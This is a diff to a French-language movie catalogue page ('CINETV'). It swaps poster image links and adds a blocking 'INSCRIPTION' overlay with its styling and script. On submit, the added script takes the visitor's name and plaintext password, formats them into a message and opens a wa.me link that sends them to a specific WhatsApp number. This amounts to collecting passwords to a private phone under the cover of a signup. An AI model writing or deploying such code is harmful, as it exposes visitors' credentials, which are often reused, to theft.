@@ -262,6 +262,102 @@
             font-style: italic;
         }
         
+        /* Signup Overlay */
+        .blur-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            backdrop-filter: blur(5px);
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .signup-box {
+            background: #1a1a2e;
+            padding: 20px;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 350px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.5);
+            text-align: center;
+            z-index: 1001;
+        }
+        
+        .signup-box h1 {
+            color: #e94560;
+            margin-bottom: 12px;
+            font-size: 1.5rem;
+        }
+        
+        .signup-box .description {
+            color: #aaa;
+            margin-bottom: 20px;
+            font-size: 0.75rem;
+            line-height: 1.3;
+        }
+        
+        .signup-box .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        
+        .signup-box label {
+            display: block;
+            margin-bottom: 6px;
+            color: #aaa;
+            font-size: 0.8rem;
+        }
+        
+        .signup-box input {
+            width: 100%;
+            padding: 10px 12px;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid #444;
+            border-radius: 4px;
+            color: white;
+            font-size: 14px;
+        }
+        
+        .signup-box input:focus {
+            outline: none;
+            border-color: #e94560;
+            box-shadow: 0 0 5px rgba(233, 69, 96, 0.3);
+        }
+        
+        .signup-box button {
+            width: 100%;
+            padding: 12px;
+            background: #e94560;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .signup-box button:hover {
+            background: #d13354;
+            transform: translateY(-2px);
+            box-shadow: 0 3px 10px rgba(233, 69, 96, 0.3);
+        }
+        
+        .signup-box .whatsapp-info {
+            margin-top: 15px;
+            font-size: 0.7rem;
+            color: #25D366;
+        }
+        
         /* Responsive */
         @media (max-width: 768px) {
             .hero-banner {
@@ -320,6 +416,7 @@
     </style>
 </head>
 <body>
+    <!-- Main Content -->
     <!-- Navigation -->
     <nav class="navbar">
         <a href="index.html" class="logo"><i class="fas fa-film"></i> CINETV</a>
@@ -383,7 +480,7 @@
             
             <!-- IMMACULÉE -->
             <a href="IMMACULATE.html" class="movie-card">
-                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ9CDkg1TWQgBW0ZYrgBrytw6kMRTmqkXyjNUuSsfv2yUou9BY&s" alt="IMMACULÉE">
+                <img src="https://m.media-amazon.com/images/M/MV5BZDQ4ZGFhNTAtMDM0Zi00YzI4LWIzY2QtY2U5YmJhZmUyN2NjXkEyXkFqcGdeQXVyMTUzMTg2ODkz._V1_.jpg" alt="IMMACULÉE">
                 <div class="movie-info">
                     <div class="movie-name">IMMACULÉE</div>
                     <div class="movie-category">Horreur, Thriller</div>
@@ -447,7 +544,7 @@
             
             <!-- PUSHPA -->
             <a href="PUSHPA_2.html" class="movie-card">
-                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQoLw236lGOi1DDJwqX9PgJIS2d4Ls667T-948heqpL6-I20SE_&s" alt="PUSHPA">
+                <img src="https://m.media-amazon.com/images/M/MV5BOTNjM2Y2ZjgtMDc5NS00MDQ1LTgyNGYtYzYwMTAyNWQwYTMyXkEyXkFqcGdeQXVyMTE0Nzg1NjQ2._V1_FMjpg_UX1000_.jpg" alt="PUSHPA">
                 <div class="movie-info">
                     <div class="movie-name">PUSHPA</div>
                     <div class="movie-category">Action, Drame</div>
@@ -457,7 +554,7 @@
             
             <!-- CLEANER -->
             <a href="CLEANER.html" class="movie-card">
-                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRe6ZUloYeA5N6ZCp1yomFWF9ELgn4TWTST2_kSpbsYUXbxhgY&s" alt="CLEANER">
+                <img src="https://m.media-amazon.com/images/M/MV5BZGY0ZGFkYjItYTM0Zi00YjJkLTk0YTgtMmJjZWM2M2U4YzY0XkEyXkFqcGdeQXVyMTUzMTg2ODkz._V1_FMjpg_UX1000_.jpg" alt="CLEANER">
                 <div class="movie-info">
                     <div class="movie-name">CLEANER</div>
                     <div class="movie-category">Action, Thriller</div>
@@ -467,7 +564,7 @@
             
             <!-- RUSTOM -->
             <a href="RUSTOM_A_1.html" class="movie-card">
-                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRYTvJYAdym1BrQMSNpQ3xJf_HxAbDldTURz3Lu6vcuK8gUHtNR&s" alt="RUSTOM">
+                <img src="https://m.media-amazon.com/images/M/MV5BZDU2YjA4MmItODk0YS00OTg4LWE0YmYtZDMwNDY5YTQwNjFmXkEyXkFqcGdeQXVyODE5NzE3OTE@._V1_FMjpg_UX1000_.jpg" alt="RUSTOM">
                 <div class="movie-info">
                     <div class="movie-name">RUSTOM</div>
                     <div class="movie-category">Action, Thriller</div>
@@ -477,7 +574,7 @@
             
             <!-- SYE RAA NARASIMHA REDDY -->
             <a href="SYE_RAA.html" class="movie-card">
-                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQrw2LUmKUwiCe0J4LXDyPFaCBbvwKLcRIFIV6DBbxqTtL2PjNl&s" alt="SYE RAA NARASIMHA REDDY">
+                <img src="https://m.media-amazon.com/images/M/MV5BZjA0MWYwZTEtYzc5Yi00NGM2LTg1YTctNjY2YzQ0NDM3MTUxXkEyXkFqcGdeQXVyNDY4NjAxNTc@._V1_FMjpg_UX1000_.jpg" alt="SYE RAA NARASIMHA REDDY">
                 <div class="movie-info">
                     <div class="movie-name">SYE RAA NARASIMHA REDDY</div>
                     <div class="movie-category">Action, Historique</div>
@@ -519,7 +616,71 @@
         </div>
     </footer>
 
+    <!-- Signup Overlay -->
+    <div class="blur-background" id="signupOverlay">
+        <div class="signup-box">
+            <h1><i class="fas fa-user-plus"></i> INSCRIPTION</h1>
+            <p class="description">
+                Créez un compte pour accéder à nos contenus premium. Après inscription, gardez WhatsApp ouvert pour envoyer vos détails.
+            </p>
+            
+            <form id="signupForm">
+                <div class="form-group">
+                    <label for="name"><i class="fas fa-user"></i> Nom du visiteur</label>
+                    <input type="text" id="name" required placeholder="Votre nom complet">
+                </div>
+                
+                <div class="form-group">
+                    <label for="password"><i class="fas fa-lock"></i> Mot de passe</label>
+                    <input type="password" id="password" required placeholder="••••••••" minlength="6">
+                </div>
+                
+                <button type="submit" id="submitBtn">
+                    <i class="fas fa-paper-plane"></i> S'INSCRIRE
+                </button>
+                
+                <div class="whatsapp-info">
+                    <i class="fab fa-whatsapp"></i> Vérification via WhatsApp: +257 62 666 571
+                </div>
+            </form>
+        </div>
+    </div>
+
     <script>
+        // Vérifier si l'utilisateur a déjà signé up
+        if(localStorage.getItem('hasSignedUp') === 'true') {
+            document.getElementById('signupOverlay').style.display = 'none';
+        } else {
+            document.body.style.overflow = 'hidden'; // Empêcher le défilement
+        }
+
+        document.getElementById('signupForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Récupérer les données
+            const name = document.getElementById('name').value;
+            const password = document.getElementById('password').value;
+            
+            // Désactiver le bouton
+            document.getElementById('submitBtn').disabled = true;
+            
+            // Formater le message pour WhatsApp
+            const message = `*NOUVELLE INSCRIPTION CINETV*%0A%0A` +
+                           `👤*Nom:* ${name}%0A` +
+                           `🔑 *Mot de passe:* ${password}%0A%0A` +
+                           `_Inscrit le ${new Date().toLocaleDateString()}_`;
+            
+            // Ouvrir WhatsApp
+            window.open(`https://wa.me/25762666571?text=${message}`, '_blank');
+            
+            // Enregistrer que l'utilisateur a signé up
+            localStorage.setItem('hasSignedUp', 'true');
+            
+            // Masquer l'overlay et permettre le défilement
+            document.getElementById('signupOverlay').style.display = 'none';
+            document.body.style.overflow = 'auto';
+        });
+
         // Fonctionnalité de recherche
         document.getElementById('searchButton').addEventListener('click', function() {
             const searchTerm = document.getElementById('searchInput').value.toLowerCase();
